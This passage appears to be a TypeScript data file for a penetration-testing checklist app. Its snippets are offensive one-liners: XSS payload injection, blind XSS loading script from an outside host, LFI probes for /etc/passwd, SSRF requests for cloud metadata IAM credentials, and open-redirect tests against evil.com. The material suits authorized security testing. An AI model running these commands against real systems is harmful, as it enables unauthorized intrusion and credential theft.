          { id: 'nr-4', label: 'Identify running services and versions' },
          { id: 'nr-5', label: 'Check for vulnerable services' },
        ],
        codeSnippets: [
          {
            title: 'Port Scanning',
            code: `# Naabu with Nmap integration
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt

# Nmap full scan
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan

# Masscan for speed
masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt`,
          },
        ],
      },
    ],
  },
  {
    id: 'injection-testing',
    title: 'Injection & XSS Testing',
    description: 'SQL Injection, XSS, and other injection vulnerability testing',
    estimatedTime: '120 minutes',
    subSections: [
      {
        id: 'sql-injection',
        title: 'SQL Injection Testing',
        estimatedTime: '40 minutes',
        tasks: [
          { id: 'sqli-1', label: 'Identify SQL-prone technologies (ASP, PHP, JSP)' },
          { id: 'sqli-2', label: 'Find endpoints with query parameters' },
          { id: 'sqli-3', label: 'Test for error-based SQL injection' },
          { id: 'sqli-4', label: 'Test for blind SQL injection' },
          { id: 'sqli-5', label: 'Use SQLMap for automated testing' },
        ],
        codeSnippets: [
          {
            title: 'SQL Technology Detection',
            code: `# For possible SQL technology detection:
subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

# For single domain:
subfinder -d http://example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`,
          },
          {
            title: 'SQL Endpoint Discovery',
            code: `# For possible SQL Endpoints:
echo http://site.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep -E '\\?[^=]+=.+$'

# This filters URLs with extensions commonly linked to SQL injection vulnerabilities`,
          },
        ],
      },
      {
        id: 'xss-testing',
        title: 'Cross-Site Scripting (XSS) Testing',
        estimatedTime: '40 minutes',
        tasks: [
          { id: 'xss-1', label: 'Run automated XSS detection with Dalfox' },
          { id: 'xss-2', label: 'Test reflected XSS with payload injection' },
          { id: 'xss-3', label: 'Test for stored XSS in forms' },
          { id: 'xss-4', label: 'Perform blind XSS testing' },
          { id: 'xss-5', label: 'Test login/signup forms for XSS' },
        ],
        codeSnippets: [
          {
            title: 'Automated XSS Testing',
            code: `echo "target.com" | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox

echo "example.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln

echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
cat xss_output.txt | grep -oP '^URL: \\K\\S+' | sed 's/=.*/=/' | sort -u > final.txt`,
          },
          {
            title: 'FFUF XSS Testing',
            code: `ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"`,
          },
          {
            title: 'Blind XSS Testing',
            code: `cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high

subfinder -d example.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"

subfinder -d example.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters

cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence`,
          },
        ],
      },
      {
        id: 'lfi-testing',
        title: 'Local File Inclusion (LFI) Testing',
        estimatedTime: '30 minutes',
        tasks: [
          { id: 'lfi-1', label: 'Identify LFI-prone parameters' },
          { id: 'lfi-2', label: 'Test with /etc/passwd payload' },
          { id: 'lfi-3', label: 'Use Nuclei LFI templates' },
          { id: 'lfi-4', label: 'Try path traversal sequences' },
          { id: 'lfi-5', label: 'Test Windows paths if applicable' },
        ],
        codeSnippets: [
          {
            title: 'Automated LFI Discovery',
            code: `nuclei -l subs.txt -t /root/nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30

echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\\*|\\$[^\\:]*):0:0:" -v

gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'`,
          },
          {
            title: 'Alternative LFI Method',
            code: `echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\\*|\\$[^\\:]*):0:0:"

# Key components:
# gf lfi: Filters URLs potentially vulnerable to LFI
# qsreplace "FUZZ": Replaces parameter values with FUZZ keyword
# ffuf: Fast web fuzzer for testing payloads
# -mr "root:(x|\\*|\\$[^\\:]*):0:0:": Matches Linux passwd file format

# Payloads: https://github.com/coffinxp/payloads/blob/main/lfi.txt`,
          },
          {
            title: 'FFUF LFI Request Mode',
            code: `ffuf -request lfi -request-proto https -w /root/wordlists/offensive\\ payloads/LFI\\ payload.txt -c -mr "root:"`,
          },
        ],
      },
    ],
  },
  {
    id: 'misc-vulns',
    title: 'Miscellaneous Vulnerabilities',
    description: 'CORS, SSRF, Open Redirect, Git Exposure and more',
    estimatedTime: '90 minutes',
    subSections: [
      {
        id: 'cors-testing',
        title: 'CORS Misconfiguration Testing',
        estimatedTime: '20 minutes',
        tasks: [
          { id: 'cors-1', label: 'Manual CORS testing with curl' },
          { id: 'cors-2', label: 'Check Access-Control-Allow-Origin header' },
          { id: 'cors-3', label: 'Test with arbitrary origin' },
          { id: 'cors-4', label: 'Use automated CORS scanners' },
          { id: 'cors-5', label: 'Verify with custom exploit PoC' },
        ],
        codeSnippets: [
          {
            title: 'Manual CORS Testing',
            code: `curl -H "Origin: http://example.com" -I https://domain.com/wp-json/

# Detailed CORS analysis
curl -H "Origin: http://example.com" -I https://domain.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"`,
          },
          {
            title: 'Automated CORS Testing',
            code: `cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt

python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\\nCookie: SESSION=Hacked"

python3 CORScanner.py -u https://example.com -d -t 10

# CORS Exploit PoC: https://github.com/coffinxp/scripts/blob/main/CorsExploit.html`,
          },
        ],
      },
      {
        id: 'subdomain-takeover',
        title: 'Subdomain Takeover Detection',
        estimatedTime: '15 minutes',
        tasks: [
          { id: 'sto-1', label: 'Run Subzy for takeover detection' },
          { id: 'sto-2', label: 'Check for dangling DNS records' },
          { id: 'sto-3', label: 'Verify SSL certificates' },
          { id: 'sto-4', label: 'Manual verification with can-i-take-over-xyz' },
        ],
        codeSnippets: [
          {
            title: 'Subzy Takeover Detection',
            code: `subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

# This tool checks for subdomain takeover by:
# - Testing multiple service providers
# - Verifying SSL certificates
# - Using high concurrency for speed
# - Hiding failed attempts to reduce noise

# Manual verification: https://github.com/EdOverflow/can-i-take-over-xyz`,
          },
        ],
      },
      {
        id: 'git-exposure',
        title: 'Git Repository Disclosure',
        estimatedTime: '10 minutes',
        tasks: [
          { id: 'git-1', label: 'Check for exposed .git directories' },
          { id: 'git-2', label: 'Look for directory listings' },
          { id: 'git-3', label: 'Download and analyze git history' },
          { id: 'git-4', label: 'Extract sensitive files from commits' },
        ],
        codeSnippets: [
          {
            title: 'Git Exposure Detection',
            code: `cat domains.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe

# This command:
# - Filters successful responses
# - Uses GF patterns to extract URLs
# - Tests for .git/ directory exposure
# - Looks for "Index of" in responses
# - Checks for directory listing`,
          },
        ],
      },
      {
        id: 'ssrf-testing',
        title: 'SSRF Testing & Exploitation',
        estimatedTime: '25 minutes',
        tasks: [
          { id: 'ssrf-1', label: 'Identify SSRF-prone parameters' },
          { id: 'ssrf-2', label: 'Test for internal service access' },
          { id: 'ssrf-3', label: 'Target cloud metadata endpoints' },
          { id: 'ssrf-4', label: 'Try IP format bypass techniques' },
          { id: 'ssrf-5', label: 'Test with DNS rebinding/callback' },
        ],
        codeSnippets: [
          {
            title: 'SSRF Parameter Discovery',
            code: `# Look for common SSRF-prone parameters in URLs
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u

# Look for API/webhook integrations or cloud metadata patterns
cat urls.txt | grep -i 'webhook\\|callback\\|upload\\|fetch\\|import\\|api' | sort -u

# Nuclei for automated scanning
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/`,
          },
          {
            title: 'SSRF Exploitation',
            code: `# Basic SSRF to local services
curl "https://target.com/page?url=http://127.0.0.1:80/"
curl "https://target.com/page?url=http://localhost:8080"

# Target internal cloud metadata
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Bypass filters with alternative IP formats
http://127.0.0.1%23.google.com
http://127.1
http://[::1]/
http://0x7f000001
http://017700000001

# DNS rebinding or callback for blind SSRF
curl "https://target.com/page?url=http://yourdomain.burpcollaborator.net"

# SSRFmap: https://github.com/swisskyrepo/SSRFmap`,
          },
        ],
      },
      {
        id: 'open-redirect',
        title: 'Open Redirect Testing',
        estimatedTime: '20 minutes',
        tasks: [
          { id: 'or-1', label: 'Find redirect parameters in URLs' },
          { id: 'or-2', label: 'Test with external domain payload' },
          { id: 'or-3', label: 'Try bypass techniques' },
          { id: 'or-4', label: 'Chain with other vulnerabilities' },
        ],
        codeSnippets: [
          {
            title: 'Open Redirect Parameter Discovery',
            code: `cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt

# Using GF patterns
cat final.txt | gf redirect | uro | sort -u | tee redirect_params.txt`,
          },
          {
            title: 'Open Redirect Testing',
            code: `cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"

subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"`,
          },
          {
            title: 'Payload-based Testing',
            code: `cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"

echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"

subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"`,
          },
        ],
      },
    ],
  },
  {
    id: 'final-guide',
    title: 'Final Guide',
    description: 'Final Checklist Summary Guide',
    estimatedTime: '15 minutes',
    subSections: [
      {
        id: 'essential-tasks',
        title: 'Essential Tasks',
        estimatedTime: '10 minutes',
        tasks: [
          { id: 'et-1', label: 'Run comprehensive subdomain enumeration' },
          { id: 'et-2', label: 'Check Metadata Whois, DNS, VHost, Real IP' },
          { id: 'et-3', label: 'Check CNAME, NS for Subdomain takeover' },
          { id: 'et-4', label: 'Sort Live targets' },
          { id: 'et-5', label: 'Visual Recon' },
          { id: 'et-6', label: 'Identify Technology' },
          { id: 'et-7', label: 'Identify all open ports and services' },
          { id: 'et-8', label: 'Comprehensive directory/file discovery' },
          { id: 'et-9', label: 'Endpoints login, API, Sensitive files, Parameter Fuzzing' },
          { id: 'et-10', label: 'Analyze all files and find Secrets, tokens' },
          { id: 'et-11', label: 'Cloud and container security review' },
          { id: 'et-12', label: 'CMS detection and vulnerability assessment' },
          { id: 'et-13', label: 'Run automated vulnerability scans' },
        ],
      },
      {
        id: 'manual-tasks',
        title: 'Manual Tasks',
        estimatedTime: '10 minutes',
        tasks: [
          { id: 'mt-1', label: 'Comprehensive social media and public information gathering' },
          { id: 'mt-2', label: 'Archive and historical data mining [wayback, pastebin, etc..]' },
          { id: 'mt-3', label: 'Search Engine Recon [shodan, FOFA, censys, crt.sh, zoomeye, etc..]' },
          { id: 'mt-4', label: 'Visit each target and endpoints manually understand workflow' },
        ],
      },
    ],
  },
];

// Helper to get all task IDs for a phase
export const getPhaseTaskIds = (phase: Phase): string[] => {
  return phase.subSections.flatMap(section => section.tasks.map(task => task.id));
};

// Helper to get all task IDs for a subsection
export const getSubSectionTaskIds = (subSection: SubSection): string[] => {
  return subSection.tasks.map(task => task.id);
};

// Get all task IDs
export const getAllTaskIds = (): string[] => {
  return checklistData.flatMap(phase => getPhaseTaskIds(phase));
};
